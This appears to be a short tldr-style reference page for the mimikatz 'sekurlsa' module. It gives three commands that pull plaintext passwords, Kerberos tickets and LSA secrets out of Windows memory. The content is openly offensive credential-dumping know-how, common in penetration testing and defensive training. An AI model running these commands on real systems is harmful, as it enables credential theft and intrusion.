# mimikatz sekurlsa

> Extract credentials and secrets from memory.
> Requires debug privileges.
> More information: <https://github.com/gentilkiwi/mimikatz>.

- Extract plaintext passwords:

`mimikatz "sekurlsa::logonpasswords"`

- List Kerberos tickets in memory:

`mimikatz "sekurlsa::tickets"`

- Dump LSA secrets:

`mimikatz "sekurlsa::secrets"`
